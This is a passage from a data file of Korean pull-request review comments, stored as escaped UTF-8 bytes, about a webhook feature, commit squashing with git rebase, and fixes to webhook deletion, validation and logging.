 . .","['\xeb\xa9\x94\xec\x8b\x9c\xec\xa7\x80\xeb\x8a\x94 en-US \xeb\xa7\x8c \xed\x95\x84\xec\x88\x98\xec\x9d\xb4\xeb\x8b\x88 \xeb\x82\x98\xeb\xa8\xb8\xec\xa7\x80\xeb\x8a\x94 \xed\x95\x98\xec\x8b\xa4 \xec\x88\x98 \xec\x9e\x88\xeb\x8a\x94 \xeb\xa7\x8c\xed\x81\xbc\xeb\xa7\x8c \xed\x95\xb4 \xec\xa3\xbc\xec\x8b\x9c\xeb\xa9\xb4 \xeb\x90\x98\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.', 'webhook\xec\x9d\x98 \xeb\x82\xb4\xeb\xb6\x80 \xeb\x8f\x99\xec\x9e\x91\xec\x97\x90 \xeb\x8c\x80\xed\x95\x9c \xeb\xac\xb8\xec\x84\x9c\xeb\xa5\xbc \xec\x9e\x91\xec\x84\xb1\xed\x95\x98\xeb\xa9\xb4 \xec\xa2\x8b\xec\x9d\x84 \xea\xb2\x83 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.  \xec\x98\x81\xec\x96\xb4\xeb\x9d\xbc\xeb\xa9\xb4 docs/technical\xec\x97\x90, \xed\x95\x9c\xea\xb5\xad\xec\x96\xb4\xeb\x9d\xbc\xeb\xa9\xb4 docs/ko/technical \xec\x97\x90 \xec\x9e\x91\xec\x84\xb1\xed\x95\x98\xec\x8b\x9c\xeb\xa9\xb4 \xeb\x90\xa9\xeb\x8b\x88\xeb\x8b\xa4.', '\xea\xb5\x89\xec\x9e\xa5\xed\x9e\x88 \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\xb4 \xeb\xa7\x8e\xec\x9d\x80\xeb\x8d\xb0 \xec\xbb\xa4\xeb\xb0\x8b \xeb\xa9\x94\xec\x84\xb8\xec\xa7\x80\xeb\xa5\xbc \xeb\xb3\xb4\xeb\xa9\xb4 \xec\xa4\x91\xea\xb0\x84\xec\xa4\x91\xea\xb0\x84 \xec\x9e\x91\xec\x97\x85\xec\x97\x90 \xeb\x8c\x80\xed\x95\xb4\xec\x84\x9c \xed\x95\x98\xeb\x82\x98\xed\x95\x98\xeb\x82\x98 \xec\xbb\xa4\xeb\xb0\x8b\xec\x9c\xbc\xeb\xa1\x9c \xeb\xb6\x84\xeb\xa6\xac\xed\x95\x9c\xea\xb2\x83 \xea\xb0\x99\xec\x9d\x80\xeb\x8d\xb0\r\n\r\n\xed\x81\xb0 \xec\x9d\x98\xeb\xaf\xb8\xeb\xa1\x9c \xeb\x8f\x99\xec\x9d\xbc\xed\x95\x9c \xea\xb8\xb0\xeb\x8a\xa5 \xea\xb0\x9c\xeb\xb0\x9c\xec\x9d\x84 \xec\x9c\x84\xed\x95\x9c \xec\xbb\xa4\xeb\xb0\x8b\xeb\x93\xa4\xec\x9d\x80 \xed\x95\xa9\xec\xb9\x98\xeb\x8a\x94\xea\xb2\x8c \xec\xa2\x8b\xec\x9d\x84\xea\xb1\xb0 \xea\xb0\x99\xeb\x84\xa4\xec\x9a\x94. \r\n\r\n ', '@npcode\r\nRebase\xeb\xa5\xbc \xed\x95\x98\xeb\xa9\xb4\xec\x84\x9c \xec\xbb\xa4\xeb\xb0\x8b \xed\x95\xb4\xec\x8b\x9c\xea\xb0\x80 \xeb\xb0\x94\xeb\x80\x8c\xec\x97\x88\xeb\x8a\x94\xeb\x8d\xb0, \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8 \xec\xa4\x91 \xec\x9d\xbc\xeb\xb6\x80\xea\xb0\x80 \xeb\x82\xa0\xec\x95\x84\xea\xb0\x80\xec\x84\x9c \xec\x9d\xb4 \xea\xb3\xb3\xec\x97\x90 \xeb\x8c\x80\xec\x8b\xa0 \xeb\x8c\x93\xea\xb8\x80\xec\x9d\x84 \xeb\x82\xa8\xea\xb9\x81\xeb\x8b\x88\xeb\x8b\xa4.\r\n\r\n- Webhook\xec\x9d\x84 \xec\x8f\xa0 \xeb\x95\x8c \xeb\xac\xb4\xec\x9d\x98\xeb\xaf\xb8\xed\x95\x9c \xed\x97\xa4\xeb\x8d\x94\xeb\xa5\xbc \xeb\x8b\xac\xec\x95\x84\xec\x84\x9c \xeb\xb3\xb4\xeb\x82\xb4\xeb\x8a\x94 \xeb\xb6\x80\xeb\xb6\x84(`.setHeader(""X-Yobi-Event"", ""hook"")`)\xec\x9d\x84 \xec\xa0\x95\xeb\xa6\xac\xed\x95\x98\xec\x98\x80\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. github\xea\xb0\x80 \xeb\xb9\x84\xec\x8a\xb7\xed\x95\x9c \xeb\xaa\xa8\xec\x96\x91\xec\x9d\x98 \xed\x97\xa4\xeb\x8d\x94\xeb\xa5\xbc \xeb\x8b\xac\xec\x95\x84\xec\x84\x9c \xeb\xa7\x9e\xec\xb6\x94\xec\x96\xb4 \xeb\xb3\xb4\xeb\x82\xb4\xeb\xa0\xa4 \xed\x96\x88\xeb\x8a\x94\xeb\x8d\xb0, redundant\xed\x95\x9c \xed\x97\xa4\xeb\x8d\x94\xec\x9d\xb8 \xea\xb2\x83 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n- \xec\xa7\x80\xec\xa0\x81\xed\x95\xb4\xec\xa3\xbc\xec\x8b\xa0 \xec\xa3\xbc\xec\x84\x9d\xec\x9d\x84 \xec\x88\x98\xec\xa0\x95\xed\x95\x98\xec\x98\x80\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4 (webhook \xea\xb4\x80\xeb\xa0\xa8 \xec\xa3\xbc\xec\x84\x9d\xec\x9d\xb8\xeb\x8d\xb0 label \xea\xb4\x80\xeb\xa0\xa8 \xec\xa3\xbc\xec\x84\x9d\xec\x9c\xbc\xeb\xa1\x9c \xeb\x8b\xac\xec\x95\x84\xeb\x86\x93\xec\x9d\x80 \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8).\r\n- messages.{locale}\xec\x97\x90\xec\x84\x9c \xeb\xb2\x88\xec\x97\xad\xed\x95\x98\xec\xa7\x80 \xec\x95\x8a\xec\x9d\x80 \xeb\xa9\x94\xec\x8b\x9c\xec\xa7\x80\xeb\xa5\xbc \xeb\xb2\x88\xec\x97\xad\xed\x95\xb4\xeb\x91\x90\xea\xb1\xb0\xeb\x82\x98 \xec\x82\xad\xec\xa0\x9c\xed\x95\xb4\xec\x84\x9c \xeb\x82\x98\xec\xa4\x91\xec\x97\x90 \xed\x99\x95\xec\x9d\xb8\xed\x95\x98\xea\xb8\xb0 \xed\x8e\xb8\xed\x95\x98\xea\xb2\x8c \xed\x95\xb4\xeb\x91\x90\xec\x97\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.', '------ \xec\x97\xac\xea\xb8\xb0\xea\xb9\x8c\xec\xa7\x80\xec\x9d\x98 \xeb\xa6\xac\xeb\xb7\xb0 \xeb\x8c\x93\xea\xb8\x80\xeb\x93\xa4\xec\x9d\x84 \xeb\xb0\x98\xec\x98\x81\xed\x95\x98\xec\x98\x80\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xed\x99\x95\xec\x9d\xb8 \xeb\xb6\x80\xed\x83\x81\xeb\x93\x9c\xeb\xa6\xac\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n- \xeb\x8f\x84\xed\x81\x90\xeb\xa8\xbc\xed\x8a\xb8\xeb\x8a\x94 \xec\x9e\x91\xec\x84\xb1\xec\xa4\x91\xec\x9d\xb8\xeb\x8d\xb0, \xec\x8b\x9c\xea\xb0\x84\xec\x9d\xb4 \xec\xa1\xb0\xea\xb8\x88 \xea\xb1\xb8\xeb\xa6\xb4 \xea\xb2\x83 \xea\xb0\x99\xec\x95\x84 \xeb\xaf\xb8\xeb\xa6\xac \xed\x99\x95\xec\x9d\xb8 \xec\x9a\x94\xec\xb2\xad \xeb\x8c\x93\xea\xb8\x80\xec\x9d\x84 \xeb\x82\xa8\xea\xb2\xa8\xeb\x86\x93\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n- Commit squashing\xec\x9d\x98 \xea\xb2\xbd\xec\x9a\xb0, \xec\x9d\xbc\xeb\x8b\xa8 @npcode \xeb\x8b\x98\xec\x9d\xb4 \xec\xa7\x80\xec\xa0\x81\xed\x95\xb4\xec\xa3\xbc\xec\x8b\xa0 \xeb\xb6\x80\xeb\xb6\x84\xec\x97\x90 \xeb\x8c\x80\xed\x95\xb4 \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xed\x95\xa9\xec\xb3\x90\xeb\x86\x93\xec\x95\x98\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xea\xb0\x9c\xec\x9d\xb8\xec\xa0\x81\xec\x9c\xbc\xeb\xa1\x9c \xec\x9e\x91\xec\x97\x85 \xeb\x8b\xa8\xec\x9c\x84\xeb\xa1\x9c \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xec\x9e\x91\xea\xb2\x8c \xeb\x81\x8a\xeb\x8a\x94 \xea\xb2\x83\xec\x9d\x84 \xec\x84\xa0\xed\x98\xb8\xed\x95\x98\xea\xb8\xb0\xeb\x8f\x84 \xed\x95\x98\xea\xb3\xa0, \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xeb\xad\x89\xec\xb9\x98\xea\xb8\xb0 \xec\x9c\x84\xed\x95\xb4 rebase\xeb\xa5\xbc \xed\x95\xb4\xeb\xb3\xb4\xeb\x8b\x88 \xec\xbb\xa4\xeb\xb0\x8b \xed\x95\xb4\xec\x8b\x9c\xea\xb0\x80 \xeb\xb3\x80\xea\xb2\xbd\xeb\x90\xa8\xec\x9c\xbc\xeb\xa1\x9c \xec\x9d\xb8\xed\x95\x98\xec\x97\xac \xeb\xa6\xac\xeb\xb7\xb0 \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8\xea\xb0\x80 \xeb\xac\xbb\xed\x9e\x88\xeb\x8a\x94 \xea\xb2\xbd\xec\x9a\xb0\xea\xb0\x80 \xec\x9e\x88\xec\x9d\x8c\xec\x9d\x84 \xeb\xb0\x9c\xea\xb2\xac\xed\x95\x98\xec\x97\xac \xec\x9d\xbc\xeb\x8b\xa8\xec\x9d\x80 \xeb\xa9\x88\xec\xb6\xb0\xeb\x86\x93\xec\x95\x98\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xec\x96\xb4\xeb\x8a\x90 \xec\xbb\xa4\xeb\xb0\x8b\xeb\x93\xa4\xec\x9d\x84 \xeb\xad\x89\xec\xb9\x98\xeb\xa9\xb4 \xec\xa2\x8b\xec\x9d\x84\xec\xa7\x80 \xec\xa7\x9a\xec\x96\xb4\xec\xa3\xbc\xec\x8b\x9c\xeb\xa9\xb4, \xeb\xa6\xac\xeb\xb7\xb0\xea\xb0\x80 \xeb\x81\x9d\xeb\x82\x98\xea\xb3\xa0 \xeb\xa8\xb8\xec\xa7\x80\xed\x95\x98\xea\xb8\xb0 \xec\xa7\x81\xec\xa0\x84\xec\x97\x90 \xec\x9e\x91\xec\x97\x85\xec\x9d\x84 \xed\x95\x98\xec\x97\xac \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8\xeb\xa5\xbc \xec\xa4\x91\xea\xb0\x84\xec\x97\x90 \xeb\x86\x93\xec\xb9\x98\xeb\x8a\x94 \xec\x9d\xbc\xec\x9d\xb4 \xec\x97\x86\xeb\x8f\x84\xeb\xa1\x9d \xed\x95\x98\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n\r\n\xec\xb9\x9c\xec\xa0\x88\xed\x95\x9c \xeb\xa6\xac\xeb\xb7\xb0\xec\x97\x90 \xea\xb0\x90\xec\x82\xac\xeb\x93\x9c\xeb\xa6\xbd\xeb\x8b\x88\xeb\x8b\xa4.', '@jihwan0321 \r\n\r\n> \xec\x96\xb4\xeb\x8a\x90 \xec\xbb\xa4\xeb\xb0\x8b\xeb\x93\xa4\xec\x9d\x84 \xeb\xad\x89\xec\xb9\x98\xeb\xa9\xb4 \xec\xa2\x8b\xec\x9d\x84\xec\xa7\x80 \xec\xa7\x9a\xec\x96\xb4\xec\xa3\xbc\xec\x8b\x9c\xeb\xa9\xb4, \xeb\xa6\xac\xeb\xb7\xb0\xea\xb0\x80 \xeb\x81\x9d\xeb\x82\x98\xea\xb3\xa0 \xeb\xa8\xb8\xec\xa7\x80\xed\x95\x98\xea\xb8\xb0 \xec\xa7\x81\xec\xa0\x84\xec\x97\x90 \xec\x9e\x91\xec\x97\x85\xec\x9d\x84 \xed\x95\x98\xec\x97\xac \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8\xeb\xa5\xbc \xec\xa4\x91\xea\xb0\x84\xec\x97\x90 \xeb\x86\x93\xec\xb9\x98\xeb\x8a\x94 \xec\x9d\xbc\xec\x9d\xb4 \xec\x97\x86\xeb\x8f\x84\xeb\xa1\x9d \xed\x95\x98\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n\r\n\xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xec\xa0\x81\xec\xa0\x88\xed\x95\x98\xea\xb2\x8c \xed\x95\xa9\xec\xb9\x98\xeb\x8a\x94 \xea\xb2\x83\xec\x97\x90\xeb\x8a\x94 \xec\x97\xac\xeb\x9f\xac\xea\xb0\x80\xec\xa7\x80 \xec\x9d\xb4\xec\x9c\xa0\xea\xb0\x80 \xec\x9e\x88\xea\xb2\xa0\xec\xa7\x80\xeb\xa7\x8c, \xec\x9d\xbc\xeb\x8b\xa8 \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa5\xbc \xed\x95\x98\xeb\x8a\x94 \xed\x98\x84 \xec\x8b\x9c\xec\xa0\x90\xec\x97\x90\xec\x84\x9c\xeb\x8a\x94 \xeb\xb6\x88\xed\x95\x84\xec\x9a\x94\xed\x95\x9c \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa1\x9c \xec\x8b\x9c\xea\xb0\x84\xec\x9d\x84 \xeb\x82\xad\xeb\xb9\x84\xed\x95\x98\xeb\x8a\x94 \xec\x9d\xbc\xec\x9d\x84 \xed\x94\xbc\xed\x95\x98\xea\xb8\xb0 \xec\x9c\x84\xed\x95\xa8\xec\x9e\x85\xeb\x8b\x88\xeb\x8b\xa4. \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa5\xbc \xed\x95\xa0 \xeb\x95\x8c \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xed\x95\x98\xeb\x82\x98\xec\x94\xa9 \xec\x82\xb4\xed\x8e\xb4\xeb\xb3\xb4\xeb\xa9\xb4\xec\x84\x9c \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa5\xbc \xed\x95\x98\xeb\x8a\x94\xeb\x8d\xb0, \xec\x96\xb4\xeb\x96\xa4 \xec\xbb\xa4\xeb\xb0\x8b\xec\x97\x90\xec\x84\x9c \xeb\xb2\x84\xea\xb7\xb8\xea\xb0\x80 \xeb\xb0\x9c\xea\xb2\xac\xeb\x90\x98\xec\x96\xb4 \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa5\xbc \xed\x96\x88\xeb\x8a\x94\xeb\x8d\xb0 \xea\xb7\xb8 \xeb\xb0\x94\xeb\xa1\x9c \xeb\x92\xa4 \xec\xbb\xa4\xeb\xb0\x8b\xec\x97\x90\xec\x84\x9c \xea\xb7\xb8 \xeb\xac\xb8\xec\xa0\x9c\xec\xa0\x90\xec\x9d\x84 \xea\xb3\xa0\xec\xb3\xa4\xeb\x8b\xa4\xeb\xa9\xb4 \xea\xb7\xb8 \xeb\xa6\xac\xeb\xb7\xb0\xeb\x8a\x94 \xec\x9d\x98\xeb\xaf\xb8\xea\xb0\x80 \xec\x97\x86\xeb\x8a\x94 \xec\x8b\x9c\xea\xb0\x84\xeb\x82\xad\xeb\xb9\x84\xea\xb0\x80 \xeb\x90\x98\xea\xb8\xb0 \xeb\x95\x8c\xeb\xac\xb8\xec\x9e\x85\xeb\x8b\x88\xeb\x8b\xa4.', '\xec\x98\x88\xeb\xa5\xbc \xeb\x93\xa4\xec\x96\xb4 \xec\xa0\x9c\xea\xb0\x80 622db29 \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xeb\xb3\xb4\xea\xb3\xa0 \xeb\xb6\x88\xed\x95\x84\xec\x9a\x94\xed\x95\x9c \xed\x97\xa4\xeb\x8d\x94\xeb\xa5\xbc \xec\xa7\x80\xec\x9b\x8c\xeb\x8b\xac\xeb\x9d\xbc\xeb\x8a\x94 \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa5\xbc \xeb\x82\xa8\xea\xb8\xb0\xeb\x8a\x94 \xea\xb2\x83\xec\x9d\x80 \xec\x9d\x98\xeb\xaf\xb8\xea\xb0\x80 \xec\x97\x86\xea\xb2\xa0\xec\xa7\x80\xec\x9a\x94. c5bd2ff \xec\x97\x90\xec\x84\x9c \xec\xa7\x80\xec\x9b\x8c\xec\xa1\x8c\xec\x9c\xbc\xeb\x8b\x88\xea\xb9\x8c\xec\x9a\x94. \xec\x9d\xb4\xeb\x9f\xb0 \xea\xb2\xbd\xec\x9a\xb0 \xea\xb7\xb8\xeb\x83\xa5 622db29 \xec\xbb\xa4\xeb\xb0\x8b\xec\x97\x90\xec\x84\x9c \xed\x97\xa4\xeb\x8d\x94\xeb\xa5\xbc \xec\xa7\x80\xec\x9a\xb0\xeb\x8a\x94 \xed\x8e\xb8\xec\x9d\xb4 \xeb\x82\x98\xec\x9d\x84 \xea\xb2\x83\xec\x9e\x85\xeb\x8b\x88\xeb\x8b\xa4.', '> \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 \xeb\xad\x89\xec\xb9\x98\xea\xb8\xb0 \xec\x9c\x84\xed\x95\xb4 rebase\xeb\xa5\xbc \xed\x95\xb4\xeb\xb3\xb4\xeb\x8b\x88 \xec\xbb\xa4\xeb\xb0\x8b \xed\x95\xb4\xec\x8b\x9c\xea\xb0\x80 \xeb\xb3\x80\xea\xb2\xbd\xeb\x90\xa8\xec\x9c\xbc\xeb\xa1\x9c \xec\x9d\xb8\xed\x95\x98\xec\x97\xac \xeb\xa6\xac\xeb\xb7\xb0 \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8\xea\xb0\x80 \xeb\xac\xbb\xed\x9e\x88\xeb\x8a\x94 \xea\xb2\xbd\xec\x9a\xb0\xea\xb0\x80 \xec\x9e\x88\xec\x9d\x8c\xec\x9d\x84 \xeb\xb0\x9c\xea\xb2\xac\xed\x95\x98\xec\x97\xac \xec\x9d\xbc\xeb\x8b\xa8\xec\x9d\x80 \xeb\xa9\x88\xec\xb6\xb0\xeb\x86\x93\xec\x95\x98\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n\r\n\xeb\xa7\x90\xec\x94\x80\xed\x95\x98\xec\x8b\xa0 \xec\x9d\xb4\xec\x9c\xa0 \xeb\x95\x8c\xeb\xac\xb8\xec\x97\x90 \xec\xb2\x98\xec\x9d\x8c\xec\x97\x90 \xeb\xa6\xac\xeb\xb2\xa0\xec\x9d\xb4\xec\x8a\xa4\xea\xb0\x80 \xec\x9e\x98 \xeb\x90\x98\xec\x96\xb4\xec\x9e\x88\xec\x9c\xbc\xeb\xa9\xb4 \xec\xa2\x8b\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xeb\xa6\xac\xeb\xb7\xb0\xeb\xa5\xbc \xec\xa7\x84\xed\x96\x89\xed\x95\x98\xeb\xa9\xb4\xec\x84\x9c \xea\xb3\xa0\xec\xb9\x98\xeb\x8a\x94 \xea\xb2\x83\xec\x9d\x80 \xec\xbb\xa4\xeb\xb0\x8b \xec\xb6\x94\xea\xb0\x80\xeb\xa1\x9c \xed\x95\x98\xea\xb3\xa0 \xeb\xa6\xac\xeb\xb7\xb0\xea\xb0\x80 \xeb\x8b\xa4 \xeb\x81\x9d\xeb\x82\x9c \xeb\x8b\xa4\xec\x9d\x8c\xec\x97\x90 \xeb\xa6\xac\xeb\xb2\xa0\xec\x9d\xb4\xec\x8a\xa4\xed\x95\x98\xeb\x8a\x94 \xea\xb2\x83\xeb\x8f\x84 \xea\xb4\x9c\xec\xb0\xae\xea\xb2\xa0\xec\xa3\xa0.', '\xeb\x8f\x84\xed\x81\x90\xeb\xa8\xbc\xed\x8a\xb8\xeb\xa5\xbc \xec\xb6\x94\xea\xb0\x80\xed\x96\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xeb\xa6\xac\xeb\xb7\xb0\xea\xb0\x80 \xeb\xa7\x88\xeb\xac\xb4\xeb\xa6\xac\xeb\x90\x98\xeb\xa9\xb4 \xec\xbb\xa4\xeb\xb0\x8b\xeb\x93\xa4\xec\x9d\x84 \xec\xa0\x95\xeb\xa6\xac\xed\x95\xb4\xec\x84\x9c \xeb\xa6\xac\xeb\xb2\xa0\xec\x9d\xb4\xec\x8a\xa4\xeb\xa5\xbc \xed\x95\xb4\xeb\x86\x93\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n\xec\x97\xac\xec\xad\xa4\xeb\xb3\xbc \xea\xb2\x83\xec\x9d\xb4 \xec\x9e\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xeb\xa7\x8c\xec\x95\xbd\xec\x97\x90 \xec\xbb\xa4\xeb\xb0\x8b \xeb\xa1\x9c\xea\xb7\xb8\xea\xb0\x80 A-B-C-D \xed\x95\x98\xeb\x8a\x94 \xec\x8b\x9d\xec\x9c\xbc\xeb\xa1\x9c \xeb\x82\xa8\xec\x95\x84\xec\x9e\x88\xea\xb3\xa0, A-C \xec\xbb\xa4\xeb\xb0\x8b\xec\x9d\x84 squash\xed\x95\x98\xec\x97\xac (A+C)-B-D \xed\x95\x98\xeb\x8a\x94 \xec\x8b\x9d\xec\x9c\xbc\xeb\xa1\x9c \xec\xa0\x95\xeb\xa6\xac\xed\x95\x98\xea\xb3\xa0 \xec\x8b\xb6\xeb\x8b\xa4\xea\xb3\xa0 \xed\x95\xa0 \xeb\x95\x8c, \xec\x96\xb4\xeb\x96\xbb\xea\xb2\x8c rebase\xeb\xa5\xbc \xed\x95\x98\xeb\xa9\xb4 \xeb\x90\x98\xeb\x82\x98\xec\x9a\x94? `git rebase -i` \xec\xbb\xa4\xeb\xa7\xa8\xeb\x93\x9c\xeb\xa1\x9c \xec\xa0\x95\xeb\xa6\xac\xeb\xa5\xbc \xed\x95\xa0\xeb\x95\x8c, \xeb\x8b\xa8\xec\x88\x9c\xed\x9e\x88 \xec\x88\x9c\xec\x84\x9c\xeb\xa7\x8c \xeb\xb0\x94\xea\xbf\x94\xeb\x86\x93\xec\x9c\xbc\xeb\xa9\xb4 \xec\x95\x8c\xec\x95\x84\xec\x84\x9c \xeb\xb0\x94\xea\xbe\xbc \xec\x88\x9c\xec\x84\x9c\xeb\x8c\x80\xeb\xa1\x9c squashing\xec\x9d\xb4 \xeb\x90\x98\xeb\x8a\x94\xec\xa7\x80 \xea\xb6\x81\xea\xb8\x88\xed\x95\xa9\xeb\x8b\x88\xeb\x8b\xa4.', '\xeb\x84\xa4, \xec\x88\x9c\xec\x84\x9c \xeb\xb0\x94\xea\xbe\xb8\xea\xb3\xa0 squash \xed\x95\xa0 \xec\xbb\xa4\xeb\xb0\x8b\xec\x97\x90 squash\xeb\x9d\xbc\xea\xb3\xa0 \xec\x8d\xa8\xec\x84\x9c rebase \xed\x95\x98\xeb\xa9\xb4 \xeb\x90\xa9\xeb\x8b\x88\xeb\x8b\xa4.', 'Rebase\xeb\xa5\xbc \xeb\xa7\x88\xec\xb3\xa4\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.', '\xeb\xb0\x98\xec\x98\x81\xed\x95\xb4\xec\x95\xbc \xed\x95\xa0 \xeb\x8b\xa4\xeb\xa5\xb8 \xec\x82\xac\xed\x95\xad\xec\x9d\xb4 \xeb\x8d\x94 \xec\x9e\x88\xeb\x82\x98\xec\x9a\x94?', 'webhook\xec\x9d\x84 \xeb\x93\xb1\xeb\xa1\x9d\xed\x95\x98\xeb\x8a\x94 \xed\x8e\x98\xec\x9d\xb4\xec\xa7\x80\xec\x97\x90\xec\x84\x9c \xeb\x93\xb1\xeb\xa1\x9d\xed\x95\x9c webhook\xec\x9d\x80 git push\xec\x8b\x9c\xec\x97\x90 \xec\x88\x98\xed\x96\x89\xeb\x90\x9c\xeb\x8b\xa4\xeb\x8a\x94 \xec\x84\xa4\xeb\xaa\x85\xec\x9d\xb4 \xeb\x82\x98\xec\x98\xa4\xeb\x82\x98\xec\x9a\x94?', '\xeb\xa6\xac\xeb\xb7\xb0\xed\x95\xb4\xec\xa3\xbc\xec\x8b\xa0 \xeb\xb6\x80\xeb\xb6\x84\xec\x9d\x84 \xed\x99\x95\xec\x9d\xb8\xed\x96\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xeb\xb0\x98\xec\x98\x81\xed\x9b\x84 \xeb\x8b\xa4\xec\x8b\x9c \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8 \xeb\x82\xa8\xea\xb8\xb0\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.', '@npcode \xeb\xa6\xac\xeb\xb7\xb0 \xeb\xb0\x98\xec\x98\x81\xec\x9d\x84 \xec\x99\x84\xeb\xa3\x8c\xed\x96\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xeb\xa6\xac\xeb\xb2\xa0\xec\x9d\xb4\xec\x8a\xa4\xeb\xa5\xbc \xed\x95\x9c \xea\xb4\x80\xea\xb3\x84\xeb\xa1\x9c \xeb\xb0\x98\xec\x98\x81\xed\x95\x9c \xec\x82\xac\xed\x95\xad\xec\x9d\x84 \xec\x95\x84\xeb\x9e\x98\xec\x97\x90 \xeb\xb3\x84\xeb\x8f\x84\xeb\xa1\x9c \xeb\x82\xa8\xea\xb9\x81\xeb\x8b\x88\xeb\x8b\xa4.\r\n- controllers.ProjectApp.deleteWebhook\xec\x97\x90\xec\x84\x9c webhook\xec\x9d\xb4 Null\xec\x9d\xbc \xec\x8b\x9c 404\xeb\xa1\x9c \xec\x9d\x91\xeb\x8b\xb5\r\n- controllers.ProjectApp.deleteWebhook\xec\x97\x90\xec\x84\x9c \xec\x9e\x98\xeb\xaa\xbb\xeb\x90\x9c IsAllowed policy \xec\x88\x98\xec\xa0\x95\r\n- controllers.ProjectApp.deleteWebhook\xec\x97\x90\xec\x84\x9c Validation logic\xec\x9d\xb4 model\xec\x97\x90 \xea\xb1\xb8\xeb\xa6\xb0 \xec\xa1\xb0\xea\xb1\xb4\xec\x97\x90 \xec\x9d\x98\xed\x95\xb4 \xec\x88\x98\xed\x96\x89\xeb\x90\x98\xea\xb2\x8c \xeb\xb3\x80\xea\xb2\xbd (validateWebhookForm \xec\x82\xad\xec\xa0\x9c). \xec\x9d\xb4\xec\x97\x90 \xeb\x94\xb0\xeb\x9d\xbc Model\xec\x9d\x98 property\xec\x97\x90 \xea\xb1\xb8\xeb\xa0\xa4\xec\x9e\x88\xeb\x8d\x98 \xec\x9d\xbc\xeb\xb6\x80 \xec\xa1\xb0\xea\xb1\xb4 \xec\x88\x98\xec\xa0\x95 / \xeb\xb6\x88\xed\x95\x84\xec\x9a\x94\xed\x95\x9c \xec\xa1\xb0\xea\xb1\xb4 \xec\xa0\x95\xeb\xa6\xac.\r\n- Webhook\xec\x9c\xbc\xeb\xa1\x9c \xec\x9d\xb8\xed\x95\xb4 \xed\x98\xb8\xec\xb6\x9c\xeb\x90\x98\xeb\x8a\x94 Request\xea\xb0\x80 2xx \xec\x9d\xb4\xec\x99\xb8\xec\x9d\x98 \xec\x9d\x91\xeb\x8b\xb5\xec\x9d\x84 \xed\x95\xa0 \xec\x8b\x9c \xec\x84\x9c\xeb\xb2\x84\xec\x97\x90 \xeb\xa1\x9c\xea\xb7\xb8\xeb\xa5\xbc \xeb\x82\xa8\xea\xb8\xb0\xea\xb2\x8c \xec\x88\x98\xec\xa0\x95.\r\n- Webhook view\xec\x97\x90\xec\x84\x9c push hook\xec\x9e\x84\xec\x9d\x84 \xeb\xaa\x85\xec\x8b\x9c\xed\x95\xa8.', '\xeb\xb0\x98\xec\x98\x81\xed\x95\xb4\xec\x95\xbc \xed\x95\xa0 \xeb\x8b\xa4\xeb\xa5\xb8 \xec\x82\xac\xed\x95\xad\xec\x9d\xb4 \xeb\x8d\x94 \xec\x9e\x88\xeb\x82\x98\xec\x9a\x94?', '\xed\x85\x8c\xec\x8a\xa4\xed\x8a\xb8\xeb\xa5\xbc \xec\xa2\x80 \xed\x95\xb4\xeb\xb4\x90\xec\x95\xbc\xea\xb2\xa0\xeb\x84\xa4\xec\x9a\x94. next\xeb\xa5\xbc \xec\xb5\x9c\xec\x8b\xa0\xed\x99\x94\xed\x96\x88\xeb\x8d\x94\xeb\x8b\x88 \xec\xb6\xa9\xeb\x8f\x8c\xed\x95\x98\xeb\x8a\x94\xeb\x8d\xb0 \xed\x95\xb4\xea\xb2\xb0 \xeb\xb6\x80\xed\x83\x81\xeb\x93\x9c\xeb\xa0\xa4\xec\x9a\x94', '@npcode next\xeb\xa5\xbc \xea\xb0\x80\xec\xa0\xb8\xec\x99\x80\xeb\xb3\xb4\xeb\x8b\x88 Schema\xea\xb0\x80 